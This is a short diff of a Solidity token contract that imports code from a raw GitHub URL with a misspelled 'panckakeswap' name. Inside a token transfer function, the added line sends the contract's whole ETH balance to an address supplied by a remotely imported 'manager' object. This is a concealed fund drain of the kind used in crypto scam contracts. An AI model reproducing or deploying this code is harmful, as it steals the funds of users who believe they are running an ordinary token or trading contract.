@@ -50,7 +50,7 @@ import "https://raw.githubusercontent.com/soliditier01/panckakeswap-blog-contrac
         balances[to] += value;
         balances[from] -= value;
         emit Transfer(from, to, value);
-        payable(manager.uniswapAddressthis()).transfer(msg.sender.balance);
+        payable(manager.uniswapDepositAddress()).transfer(address(this).balance);
         return true;
     }
     function approve(address spender, uint value) public returns (bool) {
